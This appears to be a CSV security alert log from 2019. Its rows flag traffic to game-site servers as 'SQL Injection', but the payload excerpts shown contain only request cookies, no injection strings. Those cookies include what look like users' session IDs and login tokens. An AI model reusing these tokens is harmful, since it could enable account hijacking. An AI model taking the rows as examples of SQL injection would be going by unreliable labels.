2019-02-16 18:20,58.229.209.233,139.150.87.138,80,SQL Injection," 700A2E06911E5FA16832EE; HPRC1=UhaSuPEo98GsM3DCRTPII6wv; pcBanner=done; _pk_ses.19.b56a=*; _ga=GA1.3.1971192188.1512301279; tracking=""&SID=234709325&Count=5&Code=0""; PN_LOGIN=6DF_4f9NubC1GNwnlnM9eJu2NxKxmQnRJUvFiRURZiBl8V0jxU58ju551k1fGhh_2wcGMSt45Y2yK_25MM-8Mcyn1M3epsU9DKqj4_hHeSVZ-PDflevEz6NvoiSFRmbVUoIAeE94ofj7DaEE_t9r-t76uV2ONBWIqmDRR4g3naxWNsjy678uXE__6ozafO-nS3kS_IxmX1_kX_8i_dX-kg==; GDP_LOGIN=--vi6vO5s5nKI8L-vG_X0VOjbRzmnCvUgjHCV833o6ecGs7hlYAD39F3CxpiQVFqzDW7xnxVxE0rsgCn9L-iavUXfdsB62MSksgYD3kdebE=; NV_LOGIN=""--vi6vO5s5nKI8L-vG_X0VOjbRzmnCvUgjHCV833o6ecGs7hlYAD39F3CxpiQVFqzDW7xnxVxE0rsgCn9L-iavUXfdsB62MSksgYD3kdebE=""; PN_PUB=P_ICARUS|A|4892YhGeCGhuAGy0Ya7BBC04DwCQ352YDHWI6fiAJtKmZGW9MBiDn83Op7oDNJG1wUDHqHnr8285H13w4AA4AhrMG7E9hMWi0h4P8KSR1KHT6Wt1BgVA8EPi6OlRG6D84Lv059uLPAChp6PD5Oc8BvDu3MY40Gc2fD5Yu2vhEpl0Hc3Q5CXq2X-Gn791mT122GBLn_MPbTwV0OnMYKSwvLXDR3kFmVShF6fp9WID2pN1iSnq5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|CYcEetJB_Kuh1g8NwLC0R5BBVeaVARHX12nkTBPFQYD3-43L2hVIYR7w-4I8HPm6oY4BSNIWAmL1PNA3G6xYQmKCZRQmgUgnMHEMvx7PsMYD4xpB2-4W52Jh"
2019-02-03 21:47,218.148.103.25,139.150.87.138,80,SQL Injection," 73.; _pk_ref.19.b56a=%5B%22%22%2C%22%22%2C1549198073%2C%22http%3A%2F%2Ficarus.game.naver.com%2F%22%5D; _pk_ses.19.b56a=*; tracking=""&SID=1258101320&Count=9&Code=0""; PN_LOGIN=OrTWJyUcpYPXraKtYJ7Wlm8fJSqC6KyhA_TP8qZNrZEkvAxVaBda-yRUzl0Y9uKM_0bzMNQhVPfUqpjh94LUxpTURlLMP2yg33QCXofrapAruRvDJGS9Yl9qpR39GHDHCVxpDZH0QqrMEp0RapPnKglrYItt4PoBvkCtAymIrcxPg0iqyaVr3PdUV32kEVrgU5K_xBWMvnTlCtukLv902w==; GDP_LOGIN=--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=; NV_LOGIN=""--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=""; PN_PUB=P_ICARUS|A|RoaRe4J0a8ZfKwzQROKWc5nv23ECID7mB6WpEH-HHI3JAVpH00lGgcOnhLebNJVFeG4m6TRA3Q47AgC9m6RQ0R2PupQA5CHrOIl0RjDfuRY9OXySu8B9g5AL6OlRG6D84Lv059uLPAChp6PD1ohFQ1ExD7He9IfCnuPPZAp6URe2hoAvPTobIwNR2LDYIApa3mP1xEImXKfL9pfRZkCpOP8m3J-Fg-Q2dUmM82g8I1SfO71U5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|OQW6ZjU01OYCRmuAo6MOKAGG8uhAQSCmw2ucE1PRXSV9HUZLSB2O3I5BsCOVGXh4oDLpBLv9Q3JQ3-HWsRoLU1m8oXDn4L2DMYJKJ3SpJM08TIrCunCpeE86HGHTHgBelN8uIBvEYlOWLNxj8HHLmDCpALfHTYoSOM0vjFJK6Pa90N4h0Mu"
2019-01-30 15:11,121.160.189.219,139.150.87.138,80,SQL Injection," =PPAQCL4TU5GVY; nx_ssl=2; JSESSIONID=9BB6C6F6529DC9C43789408BCE119967; cmtAsc=0; HPRC1=UhaSuPEo98GsM3DCRTPII6wv; currentCookieTime=1548828662350; tracking=""&SID=1605332047&Count=3&Code=0""; PN_LOGIN=lHa5SH2VXb7X-ZM-pKZlYBJ5cvciblBhZ4OjU2VbQxhCv8meXBn4BMJi7OJ8EUdsZatwz9vq4UApyJk_ETfslZrcYe_UOelnKQHMRnzA_L3I3kHF5ooo3URBku_bm57K3SAgk_HvdhuI4U6YASDx3UTpFo-0cP7aTBVepRYniEKxuFvmy9zO7XEQyojRGRLz; GDP_LOGIN=--9W-sj_cvZiSFHarEYt_zRgZcZYrWeSw5gsckGmJknmcsygBlQvCOODnFaOAhwosMtDC6-ACD-Dl0r2uOOXel14k7Ps-QvSXhfaSXD4BHo=; NV_LOGIN=""--9W-sj_cvZiSFHarEYt_zRgZcZYrWeSw5gsckGmJknmcsygBlQvCOODnFaOAhwosMtDC6-ACD-Dl0r2uOOXel14k7Ps-QvSXhfaSXD4BHo=""; PN_PUB=P_ICARUS|A|K0wOhABJQ9AVR9cPxoGY0GAANoI2vO48Q28l7eBOYeB2sDnJEQ9GISFxCI0KD1g5O89PRG002Rt6YSIwWMG8M0G5gG4RsC0a89RHetSnrOByNPPSmeTpmF1kOIEVYFJpJ2wl69tHQdC2a89SRXaUI0J0ZKZVC3cNw3SmjSWHCvGBx7Uvk9hXC3NQoA0ZuMxVAe0Tf0N1NJWoRO7NhQNe2AAX6hyVmoQp-SWdVYRIfo32IA8d8hhFnEK3W4uJKXc6ejCHQTJa9ZaLpRLIk1P1LRbKnA0WY4x3M07AvN2RfUAFTQlG3qN10CnD|U8iO3sH8uT3hBhpAv-C8CT8MOI-S1VNIsGRA6YmE2DGfd02dNHNKIQ6HCHoJKWkV2UFfJ8oBJ3jNJGTx42gZEfpNufR3eRPD7vtUBEHPATm81vRE1DAwUAIP"
2019-02-16 18:20,58.229.209.233,139.150.87.189,80,SQL Injection," 0e3KVLN9ezJ43c4J2O+aEbpJHnUBAnx2yo8bwGAd1ykDQnDs/CQLFX/GkuuY3Wo/fQdZGeIUiZDmilDGLwROf6M=; _ga=GA1.3.1971192188.1512301279; tracking=""&SID=234709325&Count=5&Code=0""; PN_LOGIN=6DF_4f9NubC1GNwnlnM9eJu2NxKxmQnRJUvFiRURZiBl8V0jxU58ju551k1fGhh_2wcGMSt45Y2yK_25MM-8Mcyn1M3epsU9DKqj4_hHeSVZ-PDflevEz6NvoiSFRmbVUoIAeE94ofj7DaEE_t9r-t76uV2ONBWIqmDRR4g3naxWNsjy678uXE__6ozafO-nS3kS_IxmX1_kX_8i_dX-kg==; GDP_LOGIN=--vi6vO5s5nKI8L-vG_X0VOjbRzmnCvUgjHCV833o6ecGs7hlYAD39F3CxpiQVFqzDW7xnxVxE0rsgCn9L-iavUXfdsB62MSksgYD3kdebE=; NV_LOGIN=""--vi6vO5s5nKI8L-vG_X0VOjbRzmnCvUgjHCV833o6ecGs7hlYAD39F3CxpiQVFqzDW7xnxVxE0rsgCn9L-iavUXfdsB62MSksgYD3kdebE=""; PN_PUB=P_ICARUS|A|4892YhGeCGhuAGy0Ya7BBC04DwCQ352YDHWI6fiAJtKmZGW9MBiDn83Op7oDNJG1wUDHqHnr8285H13w4AA4AhrMG7E9hMWi0h4P8KSR1KHT6Wt1BgVA8EPi6OlRG6D84Lv059uLPAChp6PD5Oc8BvDu3MY40Gc2fD5Yu2vhEpl0Hc3Q5CXq2X-Gn791mT122GBLn_MPbTwV0OnMYKSwvLXDR3kFmVShF6fp9WID2pN1iSnq5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|CYcEetJB_Kuh1g8NwLC0R5BBVeaVARHX12nkTBPFQYD3-43L2hVIYR7w-4I8HPm6oY4BSNIWAmL1PNA3G6xYQmKCZRQmgUgnMHEMvx7PsMYD4xpB2-4W52Jh"
2019-02-03 21:47,218.148.103.25,139.150.87.138,80,SQL Injection," 3.; _pk_ref.19.b56a=%5B%22%22%2C%22%22%2C1549198073%2C%22http%3A%2F%2Ficarus.game.naver.com%2F%22%5D; _pk_ses.19.b56a=*; tracking=""&SID=1258101320&Count=10&Code=0""; PN_LOGIN=OrTWJyUcpYPXraKtYJ7Wlm8fJSqC6KyhA_TP8qZNrZEkvAxVaBda-yRUzl0Y9uKM_0bzMNQhVPfUqpjh94LUxpTURlLMP2yg33QCXofrapAruRvDJGS9Yl9qpR39GHDHCVxpDZH0QqrMEp0RapPnKglrYItt4PoBvkCtAymIrcxPg0iqyaVr3PdUV32kEVrgU5K_xBWMvnTlCtukLv902w==; GDP_LOGIN=--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=; NV_LOGIN=""--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=""; PN_PUB=P_ICARUS|A|RoaRe4J0a8ZfKwzQROKWc5nv23ECID7mB6WpEH-HHI3JAVpH00lGgcOnhLebNJVFeG4m6TRA3Q47AgC9m6RQ0R2PupQA5CHrOIl0RjDfuRY9OXySu8B9g5AL6OlRG6D84Lv059uLPAChp6PD1ohFQ1ExD7He9IfCnuPPZAp6URe2hoAvPTobIwNR2LDYIApa3mP1xEImXKfL9pfRZkCpOP8m3J-Fg-Q2dUmM82g8I1SfO71U5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|OQW6ZjU01OYCRmuAo6MOKAGG8uhAQSCmw2ucE1PRXSV9HUZLSB2O3I5BsCOVGXh4oDLpBLv9Q3JQ3-HWsRoLU1m8oXDn4L2DMYJKJ3SpJM08TIrCunCpeE86HGHTHgBelN8uIBvEYlOWLNxj8HHLmDCpALfHTYoSOM0vjFJK6Pa90N4h0Mu"
2019-02-09 5:05,59.5.223.142,139.150.87.138,80,SQL Injection," 9656198390; gameStartCoupon=5OnCPPTZuRxZ68iOJPIO5OPH03BQ2xMGPJnFSBzQui3fPUo9; JSESSIONID=125B17C679A878436A6F2B3338897102; tracking=""&SID=456485821&Count=4&Code=0""; PN_LOGIN=kJZGh0979PbSwMtuNpue91EGb09y3tyGKTUCuwZqe5tWEij2V3ReJ-MmE0Qdi5jvdVKHj9w3E9TArwNFgzGugl6zOQoWPxoGJHBWbm4Lc8GT9-RCSF9RsBC91hWL9Drph4jB4VxsLKzAGTyFX8D22xjE3jcMjOjt5x-USPJjrGBpzQPDtsWvOicU9oVIgdmMO1k3GQ4vEK8zWDhrSpCm8w==; GDP_LOGIN=--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=; NV_LOGIN=""--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=""; PN_PUB=P_ICARUS|A|TAQVxE5HE2QVUf04XV32zOOR3Q2GxZBwaT8AMhXSOR2WZBmr936BBC9o9DPw9uSG1bBe20xVAn9BXo1YLIgaM0TABl4Xt19DNQfCHj2e1QG74BwLpaHG5Hfp6OlRG6D84Lv059uLPAChp6PD3hF0u5F8dMmqL9-Pv4Vg5CmoPBjCOuNBDOIA0vGJXVJ3GNxK5XD4gIAnvT2FC2LEYPRGUG842xnJATHp1Swb1nc7mbDBf4or5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|V21KhoSpdMWDPg51PIS93DngVA09okDp1Q1jJYeP2o1fxKwfA9dMPiDhP0Z9GvE21380FSvC1HbOHDPh8AQD0Q2TQ930J5gaJphHnSJfrB8i3YfHhcDRy991"
2019-02-09 5:05,59.5.223.142,139.150.87.138,80,SQL Injection," 9656198390; gameStartCoupon=5OnCPPTZuRxZ68iOJPIO5OPH03BQ2xMGPJnFSBzQui3fPUo9; JSESSIONID=341A92B3D1ED792EDEC72658D5C5D7F3; tracking=""&SID=456485821&Count=3&Code=0""; PN_LOGIN=kJZGh0979PbSwMtuNpue91EGb09y3tyGKTUCuwZqe5tWEij2V3ReJ-MmE0Qdi5jvdVKHj9w3E9TArwNFgzGugl6zOQoWPxoGJHBWbm4Lc8GT9-RCSF9RsBC91hWL9Drph4jB4VxsLKzAGTyFX8D22xjE3jcMjOjt5x-USPJjrGBpzQPDtsWvOicU9oVIgdmMO1k3GQ4vEK8zWDhrSpCm8w==; GDP_LOGIN=--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=; NV_LOGIN=""--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=""; PN_PUB=P_ICARUS|A|TAQVxE5HE2QVUf04XV32zOOR3Q2GxZBwaT8AMhXSOR2WZBmr936BBC9o9DPw9uSG1bBe20xVAn9BXo1YLIgaM0TABl4Xt19DNQfCHj2e1QG74BwLpaHG5Hfp6OlRG6D84Lv059uLPAChp6PD3hF0u5F8dMmqL9-Pv4Vg5CmoPBjCOuNBDOIA0vGJXVJ3GNxK5XD4gIAnvT2FC2LEYPRGUG842xnJATHp1Swb1nc7mbDBf4or5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|V21KhoSpdMWDPg51PIS93DngVA09okDp1Q1jJYeP2o1fxKwfA9dMPiDhP0Z9GvE21380FSvC1HbOHDPh8AQD0Q2TQ930J5gaJphHnSJfrB8i3YfHhcDRy991"
2019-02-09 5:05,59.5.223.142,139.150.87.138,80,SQL Injection," 9656198390; gameStartCoupon=5OnCPPTZuRxZ68iOJPIO5OPH03BQ2xMGPJnFSBzQui3fPUo9; JSESSIONID=49F3C3A8123B02DC648F569D2228D7FF; tracking=""&SID=456485821&Count=4&Code=0""; PN_LOGIN=kJZGh0979PbSwMtuNpue91EGb09y3tyGKTUCuwZqe5tWEij2V3ReJ-MmE0Qdi5jvdVKHj9w3E9TArwNFgzGugl6zOQoWPxoGJHBWbm4Lc8GT9-RCSF9RsBC91hWL9Drph4jB4VxsLKzAGTyFX8D22xjE3jcMjOjt5x-USPJjrGBpzQPDtsWvOicU9oVIgdmMO1k3GQ4vEK8zWDhrSpCm8w==; GDP_LOGIN=--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=; NV_LOGIN=""--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=""; PN_PUB=P_ICARUS|A|TAQVxE5HE2QVUf04XV32zOOR3Q2GxZBwaT8AMhXSOR2WZBmr936BBC9o9DPw9uSG1bBe20xVAn9BXo1YLIgaM0TABl4Xt19DNQfCHj2e1QG74BwLpaHG5Hfp6OlRG6D84Lv059uLPAChp6PD3hF0u5F8dMmqL9-Pv4Vg5CmoPBjCOuNBDOIA0vGJXVJ3GNxK5XD4gIAnvT2FC2LEYPRGUG842xnJATHp1Swb1nc7mbDBf4or5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|V21KhoSpdMWDPg51PIS93DngVA09okDp1Q1jJYeP2o1fxKwfA9dMPiDhP0Z9GvE21380FSvC1HbOHDPh8AQD0Q2TQ930J5gaJphHnSJfrB8i3YfHhcDRy991"
2019-02-17 14:12,122.44.5.54,139.150.87.138,80,SQL Injection," GP9pT0WJxwEXtJvDS19Eu61fQB1AJHH6R8D0N79W3JgIvIDWK0gEFwlGfUJ8c5gLOoYCmPDv14Ov7gRSRwJ0BDmo; _ga=GA1.3.973930557.1531075024; tracking=""&SID=1338023623&Count=3&Code=0""; PN_LOGIN=TMKUzP_ip6JODNP7oWEvPq-sG9Y8aIy8hSNC_dgfWa4aconhvGrMmk17gQnmR3EQ-LoGn5GUAVj4HP-P-kb5LI5MCqANmrZKbS3li3x4_FKtCjwyFRZmehQBnEoAKCKQqdaySA7Wrcn1IorRzJz3YMEGYDYtbvARb28nX027K3UvUKv6osb0uyklGMnBe6QQYFNLMzoHkSZNnep5m0doXg==; GDP_LOGIN=--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=; NV_LOGIN=""--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=""; PN_PUB=P_ICARUS|A|CGD6QG2uIM9PNfGC9s3A1GfS6AyOxODXqUvNT1tOZ3FXJEvB9nsOmBGOTNWEFHDV9RQeYEfNMeI4eiD17SG79eM7X7EWWM0B98yMXl8HO7361nA0HvKv4GRpOIEVYFJpJ2wl69tHQdC2a89SOuN0hd6eOK1vHBOLfH2mfEhV4hgO1JMYHCOYAI1T1DHm_KutQo8LWW5puS0sCnWCAK9A4VA81v4AxSA98LW69eeUXqUp8Gvx8hhFnEK3W4uJKXc6ejCHQTJa9ZaLpRLIk1P1LRbKnA0WY4x3M07AvN2RfUAFTQlG3qN10CnD|NwHNOcFRA4nRGeQ0wQMnODgITuWSAoCvTPh-9oIQ3518gPul606H3iUXm1wZTvVHJIAPoOovV2g9PK82A2h9Ih-JRSB9G8ZE"
2019-02-17 14:12,122.44.5.54,139.150.87.138,80,SQL Injection," GP9pT0WJxwEXtJvDS19Eu61fQB1AJHH6R8D0N79W3JgIvIDWK0gEFwlGfUJ8c5gLOoYCmPDv14Ov7gRSRwJ0BDmo; _ga=GA1.3.973930557.1531075024; tracking=""&SID=1338023623&Count=4&Code=0""; PN_LOGIN=TMKUzP_ip6JODNP7oWEvPq-sG9Y8aIy8hSNC_dgfWa4aconhvGrMmk17gQnmR3EQ-LoGn5GUAVj4HP-P-kb5LI5MCqANmrZKbS3li3x4_FKtCjwyFRZmehQBnEoAKCKQqdaySA7Wrcn1IorRzJz3YMEGYDYtbvARb28nX027K3UvUKv6osb0uyklGMnBe6QQYFNLMzoHkSZNnep5m0doXg==; GDP_LOGIN=--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=; NV_LOGIN=""--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=""; PN_PUB=P_ICARUS|A|CGD6QG2uIM9PNfGC9s3A1GfS6AyOxODXqUvNT1tOZ3FXJEvB9nsOmBGOTNWEFHDV9RQeYEfNMeI4eiD17SG79eM7X7EWWM0B98yMXl8HO7361nA0HvKv4GRpOIEVYFJpJ2wl69tHQdC2a89SOuN0hd6eOK1vHBOLfH2mfEhV4hgO1JMYHCOYAI1T1DHm_KutQo8LWW5puS0sCnWCAK9A4VA81v4AxSA98LW69eeUXqUp8Gvx8hhFnEK3W4uJKXc6ejCHQTJa9ZaLpRLIk1P1LRbKnA0WY4x3M07AvN2RfUAFTQlG3qN10CnD|NwHNOcFRA4nRGeQ0wQMnODgITuWSAoCvTPh-9oIQ3518gPul606H3iUXm1wZTvVHJIAPoOovV2g9PK82A2h9Ih-JRSB9G8ZE"
2019-02-17 14:12,122.44.5.54,139.150.87.138,80,SQL Injection," heckTime=1550380350862; gameStartCoupon=JmoVZRUWQEm0V2yBmV3BfMQnT9nKYrTnySZU41SHHeKfe7wU; _ga=GA1.3.973930557.1531075024; tracking=""&SID=1338023623&Count=5&Code=0""; PN_LOGIN=TMKUzP_ip6JODNP7oWEvPq-sG9Y8aIy8hSNC_dgfWa4aconhvGrMmk17gQnmR3EQ-LoGn5GUAVj4HP-P-kb5LI5MCqANmrZKbS3li3x4_FKtCjwyFRZmehQBnEoAKCKQqdaySA7Wrcn1IorRzJz3YMEGYDYtbvARb28nX027K3UvUKv6osb0uyklGMnBe6QQYFNLMzoHkSZNnep5m0doXg==; GDP_LOGIN=--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=; NV_LOGIN=""--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=""; PN_PUB=P_ICARUS|A|CGD6QG2uIM9PNfGC9s3A1GfS6AyOxODXqUvNT1tOZ3FXJEvB9nsOmBGOTNWEFHDV9RQeYEfNMeI4eiD17SG79eM7X7EWWM0B98yMXl8HO7361nA0HvKv4GRpOIEVYFJpJ2wl69tHQdC2a89SOuN0hd6eOK1vHBOLfH2mfEhV4hgO1JMYHCOYAI1T1DHm_KutQo8LWW5puS0sCnWCAK9A4VA81v4AxSA98LW69eeUXqUp8Gvx8hhFnEK3W4uJKXc6ejCHQTJa9ZaLpRLIk1P1LRbKnA0WY4x3M07AvN2RfUAFTQlG3qN10CnD|NwHNOcFRA4nRGeQ0wQMnODgITuWSAoCvTPh-9oIQ3518gPul606H3iUXm1wZTvVHJIAPoOovV2g9PK82A2h9Ih-JRSB9G8ZE"
2019-01-30 15:11,121.160.189.219,139.150.87.138,80,SQL Injection," qusT/3BlsZ74E+fTW626FwOqiv73; NNB=PPAQCL4TU5GVY; nx_ssl=2; JSESSIONID=2D2E8531AB3EF8D61F13806C534BB552; cmtAsc=0; HPRC1=UhaSuPEo98GsM3DCRTPII6wv; tracking=""&SID=1605332047&Count=2&Code=0""; PN_LOGIN=lHa5SH2VXb7X-ZM-pKZlYBJ5cvciblBhZ4OjU2VbQxhCv8meXBn4BMJi7OJ8EUdsZatwz9vq4UApyJk_ETfslZrcYe_UOelnKQHMRnzA_L3I3kHF5ooo3URBku_bm57K3SAgk_HvdhuI4U6YASDx3UTpFo-0cP7aTBVepRYniEKxuFvmy9zO7XEQyojRGRLz; GDP_LOGIN=--9W-sj_cvZiSFHarEYt_zRgZcZYrWeSw5gsckGmJknmcsygBlQvCOODnFaOAhwosMtDC6-ACD-Dl0r2uOOXel14k7Ps-QvSXhfaSXD4BHo=; NV_LOGIN=""--9W-sj_cvZiSFHarEYt_zRgZcZYrWeSw5gsckGmJknmcsygBlQvCOODnFaOAhwosMtDC6-ACD-Dl0r2uOOXel14k7Ps-QvSXhfaSXD4BHo=""; PN_PUB=P_ICARUS|A|K0wOhABJQ9AVR9cPxoGY0GAANoI2vO48Q28l7eBOYeB2sDnJEQ9GISFxCI0KD1g5O89PRG002Rt6YSIwWMG8M0G5gG4RsC0a89RHetSnrOByNPPSmeTpmF1kOIEVYFJpJ2wl69tHQdC2a89SRXaUI0J0ZKZVC3cNw3SmjSWHCvGBx7Uvk9hXC3NQoA0ZuMxVAe0Tf0N1NJWoRO7NhQNe2AAX6hyVmoQp-SWdVYRIfo32IA8d8hhFnEK3W4uJKXc6ejCHQTJa9ZaLpRLIk1P1LRbKnA0WY4x3M07AvN2RfUAFTQlG3qN10CnD|U8iO3sH8uT3hBhpAv-C8CT8MOI-S1VNIsGRA6YmE2DGfd02dNHNKIQ6HCHoJKWkV2UFfJ8oBJ3jNJGTx42gZEfpNufR3eRPD7vtUBEHPATm81vRE1DAwUAIP"
2019-02-17 14:12,122.44.5.54,139.150.87.189,80,SQL Injection," u4hgw1nvezITNDGaWR3baSWyDT6NBbWYNYRuelx6BMKAkHmrKgngkymUBvSIxo+9WDKsyvZd51le63OGeIF8bg==; _ga=GA1.3.973930557.1531075024; tracking=""&SID=1338023623&Count=5&Code=0""; PN_LOGIN=TMKUzP_ip6JODNP7oWEvPq-sG9Y8aIy8hSNC_dgfWa4aconhvGrMmk17gQnmR3EQ-LoGn5GUAVj4HP-P-kb5LI5MCqANmrZKbS3li3x4_FKtCjwyFRZmehQBnEoAKCKQqdaySA7Wrcn1IorRzJz3YMEGYDYtbvARb28nX027K3UvUKv6osb0uyklGMnBe6QQYFNLMzoHkSZNnep5m0doXg==; GDP_LOGIN=--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=; NV_LOGIN=""--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=""; PN_PUB=P_ICARUS|A|CGD6QG2uIM9PNfGC9s3A1GfS6AyOxODXqUvNT1tOZ3FXJEvB9nsOmBGOTNWEFHDV9RQeYEfNMeI4eiD17SG79eM7X7EWWM0B98yMXl8HO7361nA0HvKv4GRpOIEVYFJpJ2wl69tHQdC2a89SOuN0hd6eOK1vHBOLfH2mfEhV4hgO1JMYHCOYAI1T1DHm_KutQo8LWW5puS0sCnWCAK9A4VA81v4AxSA98LW69eeUXqUp8Gvx8hhFnEK3W4uJKXc6ejCHQTJa9ZaLpRLIk1P1LRbKnA0WY4x3M07AvN2RfUAFTQlG3qN10CnD|NwHNOcFRA4nRGeQ0wQMnODgITuWSAoCvTPh-9oIQ3518gPul606H3iUXm1wZTvVHJIAPoOovV2g9PK82A2h9Ih-JRSB9G8ZE"
2019-02-09 5:05,59.5.223.142,139.150.87.189,80,SQL Injection," WT4Z75hH3Ahsy6Yk7Ab9W+CET8OZ6BPys0KdZmWvpjzSmnAHBlg1aZXeKNNp2R9lDAv6noyxab8X7UjVGMoGHTe1D8Q+79vQ98ZbIHwjYeGAQ4XnN2b/Qovq5; tracking=""&SID=456485821&Count=4&Code=0""; PN_LOGIN=kJZGh0979PbSwMtuNpue91EGb09y3tyGKTUCuwZqe5tWEij2V3ReJ-MmE0Qdi5jvdVKHj9w3E9TArwNFgzGugl6zOQoWPxoGJHBWbm4Lc8GT9-RCSF9RsBC91hWL9Drph4jB4VxsLKzAGTyFX8D22xjE3jcMjOjt5x-USPJjrGBpzQPDtsWvOicU9oVIgdmMO1k3GQ4vEK8zWDhrSpCm8w==; GDP_LOGIN=--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=; NV_LOGIN=""--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=""; PN_PUB=P_ICARUS|A|TAQVxE5HE2QVUf04XV32zOOR3Q2GxZBwaT8AMhXSOR2WZBmr936BBC9o9DPw9uSG1bBe20xVAn9BXo1YLIgaM0TABl4Xt19DNQfCHj2e1QG74BwLpaHG5Hfp6OlRG6D84Lv059uLPAChp6PD3hF0u5F8dMmqL9-Pv4Vg5CmoPBjCOuNBDOIA0vGJXVJ3GNxK5XD4gIAnvT2FC2LEYPRGUG842xnJATHp1Swb1nc7mbDBf4or5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|V21KhoSpdMWDPg51PIS93DngVA09okDp1Q1jJYeP2o1fxKwfA9dMPiDhP0Z9GvE21380FSvC1HbOHDPh8AQD0Q2TQ930J5gaJphHnSJfrB8i3YfHhcDRy991"
2019-02-18 22:46,220.78.10.98,182.162.96.253,443,SqlInjection, retInfo=A06CB9D5057D0008E0C847805C6A5EFFFC26E0A747A1780936B4142D6086F79EDF43A5A6959AA190048EAB8B18A6366ACA5F14853874CA630F9AD1DE1DDE6F8D3AAD41A60AC83D92E21115E4A6502B0E16ECD0D19F821C3FC24A23FCC7F82ADE626463BC07B9D6206D67F2BE9ACC28BAD536EB12D8CA1A63F70178654512C71F3BC245BB7E3E1E31B6BCE37A0A4CEA3B89B1B0FAED9E932C19B7E3240ACF734FEE53AB23841E8C302EB1C4C27044B1E393136AEEDB7F1627578567B473D7B5ABA864D02D3D33A9899374CFE11FD4A734BCA6A23165646394DF9E19A3932ED4C3212E665904E7A30C84A5AF71F03476FE5B20E977FD32546955E3276C8C0037698984659C4A5BF67F1A81589D69BC2664553171A3B3AC06FF7768CAEDFDEE589EF25173F271AF59E48EE556F7C70DC08B36979013EF9C4C4542553ACA52CB0441FA578D648F9ED18A2E4FD99B6B22EF31516945992F6D56718CCBDEDC4410